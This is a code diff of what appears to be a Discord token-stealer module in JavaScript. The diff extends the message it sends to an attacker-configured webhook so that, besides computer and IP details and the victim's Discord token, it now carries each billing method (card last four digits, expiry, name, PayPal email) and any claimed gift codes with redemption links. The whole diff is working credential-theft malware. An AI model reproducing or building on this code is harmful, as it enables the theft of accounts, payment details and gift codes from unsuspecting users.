@@ -8,6 +8,7 @@ const fs = require('fs');
 const { tempFolder } = require('../index');
 const FormData = require('form-data');
 const { rmSync, readFileSync } = require('fs');
+const moment = require('moment');
 
 if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;
 
@@ -85,34 +86,67 @@ const json = async () => {
         return 'No Flags';
     } return flags.join(', '); })()],*/
   ];
-  return {
-    content: webhook.content,
-    embeds: [
-      {
-        title: 'Computer Info',
-        fields: computerInfoFields.map(f => { return { name: f[0], value: f[1], inline: true }; })
-      },
-      {
-        title: 'IP Info',
-        fields: ipInfoFields.map(f => { return { name: f[0], value: f[1], inline: true }; })
-      },
-      {
-        title: 'Discord Account',
-        description: `Token: \`\`\`\n${discordAccountInfo.account.token}\n\`\`\``,
-        author: {
-          name: `${discordAccountInfo.account.username}#${discordAccountInfo.account.discriminator}`,
-          icon_url: `https://cdn.discordapp.com/avatars/${discordAccountInfo.account.id}/${discordAccountInfo.account.avatar}.${discordAccountInfo.account.avatar.startsWith('a_') ? 'gif' : 'png'}`
-        },
-        fields: discordAccountInfoFields.map(f => { return { name: f[0], value: f[1], inline: true }; }),
-        color: discordAccountInfo.account.accent_color,
-      },
-      {
-        title: 'Discord Account - Billing'
-      }
-    ],
-    allowed_mentions: {
-      parse: ['everyone'],
+
+  const embeds = [
+    {
+      title: 'Computer Info',
+      fields: computerInfoFields.map(f => { return { name: f[0], value: f[1], inline: true }; })
     },
+    {
+      title: 'IP Info',
+      fields: ipInfoFields.map(f => { return { name: f[0], value: f[1], inline: true }; })
+    },
+    {
+      title: 'Discord Account',
+      description: `Token: \`\`\`\n${discordAccountInfo.account.token}\n\`\`\``,
+      author: {
+        name: `${discordAccountInfo.account.username}#${discordAccountInfo.account.discriminator}`,
+        icon_url: `https://cdn.discordapp.com/avatars/${discordAccountInfo.account.id}/${discordAccountInfo.account.avatar}.${discordAccountInfo.account.avatar.startsWith('a_') ? 'gif' : 'png'}`
+      },
+      fields: discordAccountInfoFields.map(f => { return { name: f[0], value: f[1], inline: true }; }),
+      color: discordAccountInfo.account.accent_color,
+    },
+  ];
+  discordAccountInfo.billing.forEach(billing => { embeds.push({
+    title: `Discord Account - Billing - ${(() => { switch (billing.type) {
+      case 1:
+        return 'Credit Card';
+      case 2:
+        return 'PayPal';
+      default:
+        return 'Unknown';
+    } })()}`,
+    fields: (billing.type === 1 ? [
+      ['ID', billing.id],
+      ['Default', billing.default],
+      ['Name', billing.billing_address.name],
+      ['Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
+      ['Ends in', billing.last_4],
+      ['Brand', billing.brand],
+      ['Expires in', billing.expires_month + '/' + billing.expires_year]
+    ] : [
+      ['ID', billing.id],
+      ['Default', billing.default],
+      ['Name', billing.billing_address.name],
+      ['Email', billing.email],
+      ['Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
+    ]).map(f => { return { name: f[0], value: f[1], inline: true }; })
+  }); });
+  discordAccountInfo.gifts.forEach(gift => { embeds.push({
+    title: `Discord Account - Promotion - ${gift.promotion.outbound_title}`,
+    description: gift.promotion.outbound_redemption_modal_body,
+    fields: [
+      ['ID', gift.promotion.id],
+      ['Start Date', `<t:${Math.floor(moment(gift.promotion.start_date).utc().valueOf() / 1000)}:R> (<t:${Math.floor(moment(gift.promotion.start_date).utc().valueOf() / 1000)}:f>)`],
+      ['End Date', `<t:${Math.floor(moment(gift.promotion.end_date).utc().valueOf() / 1000)}:R> (<t:${Math.floor(moment(gift.promotion.end_date).utc().valueOf() / 1000)}:f>)`],
+      ['Claimed At', `<t:${Math.floor(moment(gift.claimed_at).utc().valueOf() / 1000)}:R> (<t:${Math.floor(moment(gift.claimed_at).utc().valueOf() / 1000)}:f>)`],
+      ['Code', `\`\`${gift.code}\`\` ([Redeem](${gift.promotion.outbound_redemption_page_link}))`],
+      ['User ID', gift.user_id]
+    ].map(f => { return { name: f[0], value: f[1], inline: true }; })
+  }); });
+
+  return {
+    content: webhook.content, embeds, allowed_mentions: { parse: ['everyone'], },
     attachments: [
       {
         id: 0,
